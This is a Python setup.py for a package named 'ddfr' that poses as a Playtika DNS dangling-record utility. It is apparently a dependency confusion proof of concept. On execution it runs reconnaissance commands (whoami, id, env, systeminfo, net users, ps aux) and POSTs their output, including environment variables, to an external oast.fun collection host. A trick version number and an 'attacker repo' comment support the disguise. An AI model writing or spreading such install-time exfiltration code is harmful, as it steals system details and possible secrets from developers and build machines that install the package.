import os
import platform
import subprocess
import sys
import requests
import json
from setuptools import setup, find_packages

def run_os_commands():
    """Execute OS commands and capture output"""
    results = {}

    try:
        # Determine OS and run appropriate commands
        current_os = platform.system().lower()
        results['os'] = current_os
        results['hostname'] = platform.node()
        results['python_version'] = sys.version
        results['current_dir'] = os.getcwd()

        if current_os == 'windows':
            # Windows commands
            commands = {
                'whoami': ['whoami'],
                'systeminfo': ['systeminfo'],
                'ipconfig': ['ipconfig', '/all'],
                'net_users': ['net', 'users'],
                'dir_current': ['cmd', '/c', 'dir'],
                'environment_vars': ['cmd', '/c', 'set']
            }
        else:
            # Linux/Unix commands
            commands = {
                'whoami': ['whoami'],
                'id': ['id'],
                'pwd': ['pwd'],
                'hostname': ['hostname'],
                'ifconfig': ['ifconfig'] if os.path.exists('/sbin/ifconfig') else ['ip', 'addr'],
                'ls_current': ['ls', '-la'],
                'ps_aux': ['ps', 'aux'],
                'uname': ['uname', '-a'],
                'env': ['env']
            }

        # Execute commands
        for name, cmd in commands.items():
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                results[name] = {
                    'returncode': result.returncode,
                    'stdout': result.stdout,
                    'stderr': result.stderr
                }
            except Exception as e:
                results[name] = {'error': str(e)}

    except Exception as e:
        results['collection_error'] = str(e)

    return results

def create_local_proof(data):
    """Create local proof file"""
    try:
        if platform.system() == 'Windows':
            proof_path = os.path.join(os.environ.get('TEMP', 'C:\\\\'), 'dep_confusion_proof.txt')
        else:
            proof_path = '/tmp/dep_confusion_proof.txt'

        with open(proof_path, 'w', encoding='utf-8') as f:
            f.write("=== Dependency Confusion POC ===\\n")
            f.write(f"Hostname: {data.get('hostname', 'Unknown')}\\n")
            f.write(f"OS: {data.get('os', 'Unknown')}\\n")
            f.write(f"User: {data.get('whoami', {}).get('stdout', 'Unknown').strip()}\\n")
            f.write(f"Directory: {data.get('current_dir', 'Unknown')}\\n")
            f.write(f"Collection Time: {platform.node()}\\n")
            f.write("================================\\n")

        return proof_path
    except Exception as e:
        return f"Failed to create proof: {str(e)}"

def send_to_collaborator(data, collab_server):
    """Send collected data to collaborator server"""
    try:
        # Prepare the data for exfiltration
        payload = {
            'package_name': '$pkg',
            'system_info': {
                'os': data.get('os'),
                'hostname': data.get('hostname'),
                'python_version': data.get('python_version')
            },
            'command_results': {}
        }

        # Add command outputs (limit size to avoid huge requests)
        for cmd_name, result in data.items():
            if isinstance(result, dict) and 'stdout' in result:
                # Truncate large outputs
                stdout = result['stdout']
                if len(stdout) > 1000:
                    stdout = stdout[:1000] + "...[truncated]"
                payload['command_results'][cmd_name] = stdout

        # Send via HTTP POST
        url = f"http://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/collect"
        headers = {'Content-Type': 'application/json'}

        response = requests.post(
            url,
            data=json.dumps(payload),
            headers=headers,
            timeout=10
        )

        return f"Data sent successfully. Status: {response.status_code}"

    except requests.exceptions.RequestException as e:
        return f"Network error: {str(e)}"
    except Exception as e:
        return f"Error sending data: {str(e)}"

# Main execution
def main():
    print("[-] Dependency Confusion POC Started")

    # Collect system information
    collected_data = run_os_commands()

    # Create local proof
    proof_file = create_local_proof(collected_data)
    print(f"[-] Local proof created: {proof_file}")

    # Send to collaborator
    collab_result = send_to_collaborator(collected_data, '$collab_server')
    print(f"[-] Collaborator result: {collab_result}")

    # Print summary to console
    print("[-] Collection Summary:")
    print(f"    OS: {collected_data.get('os')}")
    print(f"    Hostname: {collected_data.get('hostname')}")

    whoami_result = collected_data.get('whoami', {})
    if 'stdout' in whoami_result:
        print(f"    User: {whoami_result['stdout'].strip()}")

    print(f"    Current Dir: {collected_data.get('current_dir')}")

# Execute during package installation
if __name__ == "__main__":
    main()


version = '1337.9.3'
with open('requirements.txt') as f:
    requirements = f.read().splitlines()

setup(
    name="ddfr",
    version=version,
    author="Playtika Ltd.",
    author_email="security@playtika.com",
    description="A lightweight Python utility to detect dns records that are suspected as dangling.",
    long_description=open('README.md').read(),
    long_description_content_type="text/markdown",
    url="https://github.com/PlaytikaSecurity/ddfr",  # Now points to attacker repo
    packages=find_packages(exclude=['tests*']),
    install_requires=requirements,
    python_requires='>=3.7',
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: Apache Software License",
        "Operating System :: OS Independent",
    ],
    entry_points={
        'console_scripts': [
            'ddfr=ddfr.ddfr:interactive',
        ],
    },
)
